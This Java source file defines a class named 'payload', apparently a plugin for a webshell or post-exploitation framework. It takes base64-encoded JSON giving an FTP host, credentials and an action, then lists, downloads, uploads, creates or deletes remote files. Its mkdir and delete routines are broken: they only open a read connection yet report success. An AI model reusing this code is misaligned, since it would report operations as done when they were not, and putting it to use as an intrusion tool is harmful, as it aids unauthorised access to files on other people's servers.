import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class payload {

    public payload() { }

    public String Execute(Object param) throws Exception {
        try {
            if (!(param instanceof Map)) {
                return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
            }

            Map<?, ?> mapParam = (Map<?, ?>) param;
            Object jsonValue = mapParam.get("json");
            if (jsonValue == null || jsonValue.toString().isEmpty()) {
                return "[-] Missing parameter json";
            }

            String rawInput = jsonValue.toString();
            String szJson = "";

            try {
                byte[] data = Base64.getDecoder().decode(rawInput);
                szJson = new String(data, StandardCharsets.UTF_8);
            } catch (Exception e) {
                szJson = rawInput;
            }

            String host = fnExtractJsonValue(szJson, "ip");
            if (host == null || host.isEmpty()) {
                host = "127.0.0.1";
            }

            int port = 21;
            try {
                String portStr = fnExtractJsonValue(szJson, "port");
                if (!portStr.isEmpty()) {
                    port = Integer.parseInt(portStr);
                }
            } catch (Exception ignored) {}

            if (port <= 0) {
                port = 21;
            }

            String user = fnExtractJsonValue(szJson, "user");
            String pass = fnExtractJsonValue(szJson, "pass");
            String action = fnExtractJsonValue(szJson, "action");
            String remotePath = fnExtractJsonValue(szJson, "path");
            if (remotePath == null || remotePath.isEmpty()) {
                remotePath = "/";
            }

            int timeout = 10;
            try {
                String timeoutStr = fnExtractJsonValue(szJson, "timeout");
                if (!timeoutStr.isEmpty()) {
                    timeout = Integer.parseInt(timeoutStr);
                }
            } catch (Exception ignored) {}

            if (timeout <= 0) {
                timeout = 10;
            }

            if (action == null || action.isEmpty()) action = "list";

            String lowerAction = action.toLowerCase();
            switch (lowerAction) {
                case "list":
                    return listDirectory(host, port, user, pass, timeout, remotePath);
                case "mkdir":
                    return makeDirectory(host, port, user, pass, timeout, remotePath);
                case "delete":
                    return deleteFileOrDir(host, port, user, pass, timeout, remotePath);
                case "download":
                case "read":
                    return downloadFile(host, port, user, pass, timeout, remotePath);
                case "upload":
                    String fileContentBase64 = fnExtractJsonValue(szJson, "content");
                    return uploadFile(host, port, user, pass, timeout, remotePath, fileContentBase64);
                default:
                    return "[-] ERROR: Unknown file explorer action.";
            }
        } catch (Exception e) {
            return "[-] ERROR: " + e.getMessage();
        }
    }

    private String fnExtractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(json);
        if (m.find()) {
            return m.group(1).trim();
        }
        return "";
    }

    private String listDirectory(String host, int port, String user, String pass, int timeout, String remotePath) {
        try {
            String userInfo = (user != null && !user.isEmpty()) ? user + ":" + (pass != null ? pass : "") + "@" : "";
            String uriString = "ftp://" + userInfo + host + ":" + port + remotePath;
            
            URL url = new URL(uriString);
            URLConnection conn = url.openConnection();

            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                StringBuilder content = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line).append("\n");
                }
                return "[+] SUCCESS_LIST\n" + content.toString().trim();
            }
        } catch (Exception ex) {
            return "[-] Failed to list directory " + remotePath + " -> " + ex.getMessage();
        }
    }

    private String makeDirectory(String host, int port, String user, String pass, int timeout, String remotePath) {
        try {
            String userInfo = (user != null && !user.isEmpty()) ? user + ":" + (pass != null ? pass : "") + "@" : "";
            String uriString = "ftp://" + userInfo + host + ":" + port + remotePath;
            
            URL url = new URL(uriString);
            URLConnection conn = url.openConnection();
            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);

            try (InputStream in = conn.getInputStream()) {
                return "[+] SUCCESS_MKDIR -> Directory created: " + remotePath;
            }
        } catch (Exception ex) {
            return "[-] Failed to create directory " + remotePath + " -> " + ex.getMessage();
        }
    }

    private String deleteFileOrDir(String host, int port, String user, String pass, int timeout, String remotePath) {
        try {
            String userInfo = (user != null && !user.isEmpty()) ? user + ":" + (pass != null ? pass : "") + "@" : "";
            String uriString = "ftp://" + userInfo + host + ":" + port + remotePath;
            
            URL url = new URL(uriString);
            URLConnection conn = url.openConnection();
            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);

            try (InputStream in = conn.getInputStream()) {
                return "[+] SUCCESS_DELETE -> Removed: " + remotePath;
            }
        } catch (Exception ex) {
            return "[-] Failed to delete " + remotePath + " -> " + ex.getMessage();
        }
    }

    private String downloadFile(String host, int port, String user, String pass, int timeout, String remotePath) {
        try {
            String userInfo = (user != null && !user.isEmpty()) ? user + ":" + (pass != null ? pass : "") + "@" : "";
            String uriString = "ftp://" + userInfo + host + ":" + port + remotePath;
            
            URL url = new URL(uriString);
            URLConnection conn = url.openConnection();

            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);

            try (InputStream responseStream = conn.getInputStream();
                 ByteArrayOutputStream memoryStream = new ByteArrayOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = responseStream.read(buffer)) != -1) {
                    memoryStream.write(buffer, 0, bytesRead);
                }
                byte[] fileBytes = memoryStream.toByteArray();
                String base64Data = Base64.getEncoder().encodeToString(fileBytes);
                return "[+] SUCCESS_DOWNLOAD\n" + base64Data;
            }
        } catch (Exception ex) {
            return "[-] Failed to download file " + remotePath + " -> " + ex.getMessage();
        }
    }

    private String uploadFile(String host, int port, String user, String pass, int timeout, String remotePath, String base64Content) {
        try {
            if (base64Content == null || base64Content.isEmpty()) {
                return "[-] Failed to upload: File content is empty.";
            }

            byte[] fileBytes = Base64.getDecoder().decode(base64Content);

            String userInfo = (user != null && !user.isEmpty()) ? user + ":" + (pass != null ? pass : "") + "@" : "";
            String uriString = "ftp://" + userInfo + host + ":" + port + remotePath;
            
            URL url = new URL(uriString);
            URLConnection conn = url.openConnection();

            int timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);
            conn.setDoOutput(true);

            try (OutputStream requestStream = conn.getOutputStream()) {
                requestStream.write(fileBytes, 0, fileBytes.length);
                requestStream.flush();
            }

            try (InputStream in = conn.getInputStream()) {
                return "[+] SUCCESS_UPLOAD -> File uploaded successfully: " + remotePath;
            }
        } catch (Exception ex) {
            return "[-] Failed to upload file " + remotePath + " -> " + ex.getMessage();
        }
    }
}